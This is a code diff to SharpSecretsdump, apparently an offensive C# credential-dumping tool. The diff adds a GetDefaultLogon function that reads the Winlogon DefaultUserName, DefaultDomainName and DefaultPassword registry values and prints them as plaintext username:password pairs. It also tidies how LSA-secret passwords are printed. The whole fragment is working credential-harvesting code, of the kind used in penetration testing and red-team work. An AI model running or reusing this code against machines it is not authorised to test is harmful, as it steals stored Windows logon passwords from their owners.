@@ -104,6 +104,36 @@ namespace SharpSecretsdump
             return hashedBootKey;
         }
 
+        public static void GetDefaultLogon()
+        {
+            byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName", true);
+            byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName", true);
+            byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword", true);
+            string username;
+            if (usernameArr != null)
+            {
+                username = Encoding.ASCII.GetString(usernameArr);
+                username = username.Remove(username.Length - 1);
+            }
+            else
+            {
+                username = "(Unkown User)";
+            }
+            if (domainArr != null)
+            {
+                string domain = Encoding.ASCII.GetString(domainArr);
+                domain = domain.Remove(domain.Length - 1);
+                username = $"{domain}\\{username}";
+            }
+            if (usernameArr != null && passwordArr != null)
+            {
+                Console.WriteLine("[*] DEFAULTPASSWORD");
+                string password = Encoding.ASCII.GetString(passwordArr);
+                password = password.Remove(password.Length - 1);
+                Console.WriteLine($"{username}:{password}");
+            }
+        }
+
         public static void GetLsaSecrets(byte[] bootKey)
         {
             try
@@ -270,7 +300,9 @@ namespace SharpSecretsdump
                                         // For some reason password can be also defined in Winlogon
                                         if (passwordArr != null)
                                         {
-                                            Console.WriteLine($"{username}:{Encoding.ASCII.GetString(passwordArr)}");
+                                            string password = Encoding.ASCII.GetString(passwordArr);
+                                            password = password.Remove(password.Length - 1);
+                                            Console.WriteLine($"{username}:{password}");
                                         }
                                     }
                                     else
